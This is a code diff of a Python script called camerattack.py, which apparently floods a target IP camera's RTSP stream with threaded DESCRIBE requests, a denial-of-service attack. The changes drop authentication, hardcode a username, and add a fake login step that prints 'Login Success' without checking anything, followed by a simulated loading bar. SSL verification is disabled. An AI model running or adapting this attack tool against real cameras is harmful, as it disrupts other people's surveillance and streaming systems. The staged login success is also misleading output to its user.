@@ -2,7 +2,6 @@ import os
 import sys
 import getpass  # For securely inputting the password
 import requests
-from requests.auth import HTTPBasicAuth
 from colorama import Fore, Style
 from halo import Halo
 import time
@@ -11,6 +10,10 @@ threads = 8
 
 # Suppress SSL warnings
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+# Color codes
+USERNAME_COLOR = Fore.GREEN + Style.BRIGHT
+PASSWORD_COLOR = Fore.GREEN + Style.BRIGHT
 
 # HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
 def do_not_write(b, _):
@@ -21,7 +24,6 @@ def rtsp_describe(target, count, username, password):
         response = requests.request(
             'DESCRIBE',
             target,
-            auth=HTTPBasicAuth(username, password),
             headers={'Accept': 'application/sdp'},
             stream=True,
             verify=False  # Disable SSL verification (use cautiously)
@@ -42,16 +44,32 @@ def main():
 
     args = sys.argv[1:]
     if len(args) == 0:
-        print("usage: camerattack [RTSP URL] [username] [password]\n\texample: `python camerattack.py rtsp://192.168.1.1:554/live.sdp admin password`\n")
+        print("usage: camerattack [RTSP URL]\n\texample: `python camerattack.py rtsp://192.168.1.1:554/live.sdp`\n")
         sys.exit(1)
 
     target = args[0]
-    username = args[1] if len(args) > 1 else input("Enter username: ")
-    password = args[2] if len(args) > 2 else getpass.getpass("Enter password: ")
+    username = "koxy"  # Hardcoded username
+    password = getpass.getpass(prompt=f"{PASSWORD_COLOR}Enter password: {Style.RESET_ALL}")
 
-    spinner = Halo(text='Starting up...', spinner='dots')
+    # Displaying username and hidden password
+    print(f"{USERNAME_COLOR}Username: {username} {Style.RESET_ALL}")
+    print(f"{PASSWORD_COLOR}Password: {'*' * len(password)} {Style.RESET_ALL}")
+
+    # Simulating login success
+    print(f"{Fore.GREEN}Login Success{Style.RESET_ALL}")
+
+    # Simulating loading from 1% to 100%
+    spinner = Halo(text='Loading:', spinner='dots')
+    for i in range(1, 101):
+        spinner.text = f'Loading: {i}%'
+        spinner.start()
+        time.sleep(0.03)  # Adjust the sleep time to control the speed of the progress bar
+        spinner.stop()
+
+    # Sleep for 3 seconds
+    time.sleep(3)
+
     spinner.start()
-
     for count in range(0, 100000, threads):
         spinner.text = f"[Attempt #{count} to #{count+threads-1}] Attacking RTSP stream..."
         spinner.start()
